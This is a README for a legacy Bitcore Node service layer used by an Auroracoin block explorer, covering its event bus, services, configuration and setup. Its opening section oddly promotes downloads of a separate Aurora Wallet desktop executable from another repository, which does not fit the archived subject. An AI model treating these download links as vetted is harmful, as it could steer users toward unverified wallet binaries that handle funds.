![Bitcore Node reference repository for the Auroracoin explorer stack](assets/aurora-wallet-desktop-app-banner.png)

# Bitcore Node

The node service layer that connected an Auroracoin full node to the original explorer, preserved as a reference repository. The downloads below are the companion Aurora Wallet desktop app.

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/blob/HEAD/COPYING"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


## What this repository does

This repository holds the service layer that sat between an Auroracoin node and the applications that wanted its data. It spoke to the node over its local remote procedure call interface, kept a set of services running in one process and exposed them to the explorer through a stable internal interface.

The design is modular. A bus carries events between services, each service registers the events it can publish and the events it consumes, and the node service translates block and transaction notifications from the core client into those events. The address service, the transaction service and the block service then store what they need in a database so the explorer can answer a query without touching the node.

Configuration lives in a small JSON file that names the network, the data directory and each service to start. The command line tool starts the process, prints the services it loaded and reports the sync state as it walks the chain.

## Who uses it

Developers building an explorer for a Bitcoin-derived chain read this repository to understand the bus and service pattern, which keeps indexing code separate from the node it follows. The `docs/` folder describes the service interface, the event names and the configuration format in enough detail to reproduce the setup.

Operators of the original explorer used it to run the stack: node, service layer and API on one machine, with the database on a separate disk when the chain grew. The article on the [on-chain transfer checklist](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/30-on-chain-transfer-checklist.md) shows how a holder checks a transaction today without running any of this.

## Setup

Install dependencies with `npm install` and start the process with `bitcore-node start`, pointing it at a configuration file that names the Auroracoin network and the data directory. The native bindings in `binding.gyp` are compiled during install, so a working compiler toolchain is required on the machine.

A configuration file lists the services to load, the database to use and the remote procedure call credentials of the node. The service layer needs a reachable node before it can index anything, and the API service in the companion repository needs this process before it can answer requests.

## Contents

`lib/` holds the core of the service layer: the bus, the service base class and the node interface. `src/` holds the native bindings source. `docs/` holds the service and configuration documentation. `bin/` holds the command line entry point, `test/` and `integration/` hold the test suites, and `example/` holds a sample configuration you can copy and edit.

The API that consumes this service lives in the insight-api repository, and the front end that consumed that API lives in the insight-ui repository.

## How the bus works

The bus is the heart of the design. Services publish events with a name and a payload, and other services subscribe to the names they care about. The node service turns a block announcement from the core client into a block event, the address service listens for it and writes the addresses it touches, and the transaction service does the same for every transaction in the block.

That indirection is what keeps the layer maintainable. An index that needs a new field subscribes to an existing event rather than modifying the node interface, and a service that becomes slow can be restarted without stopping the others. The cost is a little latency between the node receiving a block and an index writing it, which is invisible on an explorer page.

The configuration file names the network, the data directory, the database and the list of services to start. A minimal deployment loads the node service, the address service and the transaction service; a full explorer adds the block service and the fee service. Each entry is a module name and an options object, so the file is readable without the source.

Native bindings appear in `binding.gyp`, which is why the install step needs a compiler. The bindings handle the parts of the protocol that are slow in JavaScript, and they are compiled during `npm install`.

The service layer also exposes its own status, which the API uses to report whether the index is behind the node. That single number answers more operator questions than any log line.

## Documentation and license

Wallet guides, release notes and checksum instructions live in the [aurora-wallet-docs repository](https://github.com/aurora-coin/aurora-wallet-docs), including the [legacy repositories](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/29-legacy-repositories-explained.md) article that places this service in the history of the network.

The code is published under the license file in the repository, with the original upstream copyright notices retained. The Auroracoin Foundation keeps it public so the explorer architecture of the network stays auditable.
